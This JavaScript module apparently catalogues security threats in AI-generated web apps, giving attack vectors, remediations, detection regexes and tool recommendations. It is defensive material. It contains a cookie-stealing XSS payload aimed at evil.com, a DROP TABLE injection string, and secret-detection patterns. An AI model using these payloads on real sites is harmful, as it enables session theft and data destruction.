/**
 * Vibe Coder Threat Matrix
 * Comprehensive security threats specific to AI-generated code
 * Based on real-world vulnerability patterns in vibe-coded applications
 */

const THREAT_MATRIX = [
  {
    id: 'VC-01',
    name: 'Hardcoded Secrets & Credential Exposure',
    severity: 'critical',
    category: 'secrets',
    description: 'AI coding tools embed API keys, database credentials, and tokens directly into source code',
    attackVector: 'Attacker scans GitHub/GitLab for leaked .env patterns, Supabase keys, Stripe secrets, or JWT signing keys using tools like truffleHog or git-secrets',
    remediation: [
      'Store all secrets in .env files that are never committed — .gitignore must list .env',
      'Use a secrets manager: Doppler, HashiCorp Vault, or Vercel Environment Variables',
      'Run truffleHog or gitleaks on every commit in CI/CD',
      'Rotate any key that was ever hardcoded — assume it\'s compromised'
    ],
    detectionPatterns: [
      /(?:AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16}/,
      /sk_live_[0-9a-zA-Z]{24}/,
      /mongodb(\+srv)?:\/\/[^:\s]+:[^@\s]+@[^\s]+/,
      /ghp_[A-Za-z0-9_]{36}/
    ],
    owaspReference: 'A07:2021 – Identification and Authentication Failures'
  },
  {
    id: 'VC-02',
    name: 'SQL & NoSQL Injection',
    severity: 'critical',
    category: 'injection',
    description: 'AI-generated queries use string interpolation instead of parameterized queries',
    attackVector: 'Attacker injects \'; DROP TABLE users; -- or crafts payload that bypasses auth logic to access all user data',
    remediation: [
      'Always use parameterized queries or ORM methods (Prisma, Drizzle, Supabase query builder)',
      'Validate and sanitize all user input server-side, never trust the client',
      'Enable Row-Level Security (RLS) in Supabase — critical for multi-tenant apps',
      'Use schema validation libraries (Zod, Yup) for input validation'
    ],
    detectionPatterns: [
      /query\s*\(\s*['"`].*\$\{.*\}/,
      /query\s*\(\s*['"`].*\+.*\+/,
      /\.find\s*\(.*req\.body/
    ],
    owaspReference: 'A03:2021 – Injection'
  },
  {
    id: 'VC-03',
    name: 'Broken Authentication & Authorization',
    severity: 'critical',
    category: 'authentication',
    description: 'AI-generated auth flows produce weak implementations with insecure token storage and missing rate limiting',
    attackVector: 'IDOR - attacker changes user_id=123 to user_id=124 in request and accesses another user\'s debt data',
    remediation: [
      'Never use custom AI-generated auth — use Clerk, Supabase Auth, or NextAuth',
      'Enforce server-side authorization checks on every API endpoint',
      'Implement RBAC (Role-Based Access Control) from day one',
      'Add rate limiting on login and sensitive endpoints (use upstash/ratelimit or Cloudflare)'
    ],
    detectionPatterns: [
      /jwt\.sign.*algorithm.*none/,
      /password.*md5|sha1/,
      /req\.params\.id.*findById/
    ],
    owaspReference: 'A07:2021 – Identification and Authentication Failures'
  },
  {
    id: 'VC-04',
    name: 'Vulnerable & Unverified Dependencies',
    severity: 'high',
    category: 'dependencies',
    description: 'AI tools pull in npm/PyPI packages automatically without version pinning or CVE scanning',
    attackVector: 'Dependency confusion or typosquatting attacks — attacker publishes package named supabase-client-utils that mimics real one and exfiltrates env vars',
    remediation: [
      'Run npm audit / pnpm audit on every build',
      'Use Snyk or Socket.dev for real-time supply chain monitoring',
      'Pin dependency versions in package-lock.json',
      'Audit any AI-suggested package before installing'
    ],
    detectionPatterns: [],
    owaspReference: 'A06:2021 – Vulnerable and Outdated Components'
  },
  {
    id: 'VC-05',
    name: 'Insecure Direct Object References (IDOR)',
    severity: 'high',
    category: 'access-control',
    description: 'Vibe-coded apps rarely include granular permission logic by default',
    attackVector: 'Attacker brute-forces numeric IDs in API routes (/api/invoices/1, /api/invoices/2) to enumerate and steal other users\' records',
    remediation: [
      'Use UUIDs instead of sequential IDs for all database records',
      'Add ownership checks on every data-fetching route: WHERE id = ? AND user_id = auth.uid()',
      'Enable Supabase RLS policies that enforce auth.uid() at database level',
      'Implement proper authorization middleware'
    ],
    detectionPatterns: [
      /findById\(req\.params\.id\)/,
      /findOne\(.*req\.query/
    ],
    owaspReference: 'A01:2021 – Broken Access Control'
  },
  {
    id: 'VC-06',
    name: 'XSS (Cross-Site Scripting)',
    severity: 'high',
    category: 'xss',
    description: 'AI-generated frontend code renders user content or URL params directly into DOM without sanitization',
    attackVector: 'Attacker injects <script>document.location=\'https://evil.com?c=\'+document.cookie</script> into user profile field or comment, stealing session tokens',
    remediation: [
      'React escapes JSX by default — but never use dangerouslySetInnerHTML unless sanitized',
      'Use DOMPurify for any HTML rendering',
      'Set proper Content Security Policy (CSP) headers in next.config.js',
      'Sanitize all user-generated content before rendering'
    ],
    detectionPatterns: [
      /dangerouslySetInnerHTML/,
      /\.innerHTML\s*=/,
      /document\.write\s*\(/,
      /\beval\s*\(/
    ],
    owaspReference: 'A03:2021 – Injection'
  },
  {
    id: 'VC-07',
    name: 'Shadow Infrastructure & Ungoverned Deployments',
    severity: 'medium',
    category: 'infrastructure',
    description: 'Vibe-coded apps spun up on personal accounts outside DevSecOps pipeline expose production data',
    attackVector: 'Attacker discovers staging deployment via subdomain enumeration (dev.app.com, preview-xyz.vercel.app) that has no auth and connects to same production database',
    remediation: [
      'Use separate Supabase projects for dev, staging, and production',
      'Add HTTP Basic Auth or IP allowlisting to all preview/staging environments',
      'Audit all deployments regularly and delete unused preview branches',
      'Implement proper environment separation'
    ],
    detectionPatterns: [],
    owaspReference: 'A05:2021 – Security Misconfiguration'
  },
  {
    id: 'VC-08',
    name: 'Sensitive Data Exposure & Logging',
    severity: 'high',
    category: 'data-exposure',
    description: 'AI-generated backend code logs too much — request bodies, auth tokens, user PII',
    attackVector: 'Attacker gains access to Vercel/Render logs or third-party logging service and harvests user emails, passwords, and payment info from verbose debug output',
    remediation: [
      'Never log passwords, tokens, PII, or financial data',
      'Use structured logging tools (Axiom, Logtail) with field-level redaction',
      'Implement sanitizeLogs() middleware that strips sensitive fields before any log call',
      'Review all console.log statements in production code'
    ],
    detectionPatterns: [
      /console\.(log|info|debug).*password|token|secret/i,
      /res\.json.*err\.stack/
    ],
    owaspReference: 'A02:2021 – Cryptographic Failures'
  },
  {
    id: 'VC-09',
    name: 'Client-Side Business Logic Manipulation',
    severity: 'critical',
    category: 'business-logic',
    description: 'AI places pricing, discount logic, or role checks on frontend, trusting the browser',
    attackVector: 'Attacker intercepts checkout request and modifies price: 9.99 payload to price: 0.01 before it hits server',
    remediation: [
      'Never trust client-side values for price, role, or quantity — always recalculate server-side',
      'Use Stripe\'s server-side price_id — never pass amounts from client',
      'Validate all business logic in API routes or Edge Functions',
      'Implement server-side validation for all critical operations'
    ],
    detectionPatterns: [
      /price.*req\.body/,
      /amount.*client/
    ],
    owaspReference: 'A08:2021 – Software and Data Integrity Failures'
  },
  {
    id: 'VC-10',
    name: 'Lack of Audit Logging & Incident Response',
    severity: 'medium',
    category: 'logging',
    description: 'Vibe-coded apps rarely include audit trails, making it impossible to detect breach or understand scope',
    attackVector: 'Attacker silently exfiltrates user data for weeks. No logs, no alerts, no way to determine what was accessed or when',
    remediation: [
      'Log all auth events, data mutations, and admin actions with timestamps and user IDs',
      'Set up anomaly alerts (Supabase has built-in audit logs; use Sentry for error monitoring)',
      'Implement basic incident response plan: detect → contain → rotate secrets → notify users',
      'Create audit trail for all sensitive operations'
    ],
    detectionPatterns: [],
    owaspReference: 'A09:2021 – Security Logging and Monitoring Failures'
  }
];

/**
 * Red Team Security Stack Recommendations
 */
const SECURITY_STACK = {
  secretScanning: {
    tools: ['gitleaks', 'truffleHog'],
    purpose: 'Detect hardcoded keys in commits'
  },
  dependencyAudit: {
    tools: ['Snyk', 'Socket.dev'],
    purpose: 'CVE & supply chain monitoring'
  },
  sast: {
    tools: ['Semgrep', 'CodeQL'],
    purpose: 'Static code vulnerability analysis'
  },
  auth: {
    tools: ['Clerk', 'Supabase Auth', 'NextAuth'],
    purpose: 'Battle-tested authentication'
  },
  rateLimiting: {
    tools: ['Upstash', 'Cloudflare'],
    purpose: 'Brute force & DDoS protection'
  },
  secretsManagement: {
    tools: ['Doppler', 'HashiCorp Vault'],
    purpose: 'Centralized secret storage'
  },
  logging: {
    tools: ['Axiom', 'Sentry', 'Logtail'],
    purpose: 'Audit trails & anomaly detection'
  },
  dast: {
    tools: ['OWASP ZAP', 'Burp Suite'],
    purpose: 'Runtime vulnerability testing'
  },
  cspHeaders: {
    tools: ['next-safe-middleware', 'helmet'],
    purpose: 'Browser-level XSS/injection defense'
  }
};

/**
 * Golden Rules for Vibe Coders
 */
const GOLDEN_RULES = [
  '53% of organizations have discovered security issues in AI-generated code that passed initial review',
  'The biggest risk isn\'t that AI writes bad code — it\'s that developers trust it without verification',
  'Always move fast on UI, but read every line of auth, payment, and data-handling code the AI generates',
  'Never trust client-side values for critical business logic',
  'Assume any hardcoded secret is compromised and rotate immediately',
  'Enable Row-Level Security (RLS) on all multi-tenant databases',
  'Use battle-tested auth providers, never roll your own',
  'Pin all dependency versions and audit them regularly',
  'Log everything except sensitive data',
  'Test backups monthly and verify restore procedures'
];

module.exports = {
  THREAT_MATRIX,
  SECURITY_STACK,
  GOLDEN_RULES
};
